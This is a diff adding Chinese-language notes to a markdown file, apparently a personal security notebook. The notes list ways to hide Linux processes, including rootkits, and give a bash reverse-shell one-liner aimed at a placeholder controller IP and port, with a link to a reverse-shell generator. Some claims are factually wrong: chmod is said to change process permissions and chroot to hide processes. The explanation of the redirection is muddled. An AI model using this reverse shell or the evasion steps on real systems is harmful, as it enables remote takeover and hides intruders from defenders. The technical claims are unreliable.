@@ -19,3 +19,30 @@ Sysdig 有着类似于 tcpdump 的过滤语法，用户可以随意组合自己�
 
 
 https://mp.weixin.qq.com/s/j4vfelk1Eu-rl2s8B70_CQ
+
+
+
+
+
+
+
+Linux 隐藏进程的方法有以下几种：
+
+- 修改进程名：通过修改进程名，使进程不易被发现。可以使用命令行工具如 ps、top 来查看进程名。修改进程名可以使用命令 prctl 或 setproctitle。
+
+- 修改进程所在目录：可以将进程所在目录修改为一个隐藏目录，使进程不易被发现。可以使用 chroot 命令将进程所在目录修改为一个隔离的目录。
+
+- 修改进程权限：可以修改进程的权限，使其只能被 root 用户或者某个特定用户访问。可以使用 chmod 命令修改进程权限。
+
+- 使用 rootkit 技术：rootkit 是一种用于隐藏进程和文件的恶意软件。可以使用 rootkit 技术隐藏进程。
+
+
+反弹shell
+一个反弹shell生成器 https://github.com/0dayCTF/reverse-shell-generator
+
+例如：
+```bash
+bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1
+```
+这个命令的作用是将标准输入、输出和错误重定向到一个 TCP 连接，从而实现反弹 shell。具体来说，该命令将标准输出和错误输出都重定向到一个 TCP 连接，并将标准输入重定向到标准输出和错误输出的合并，从而使得攻击者可以通过控制端口向目标机器发送命令并获取输出，实现反弹 shell 的效果。  
+https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean
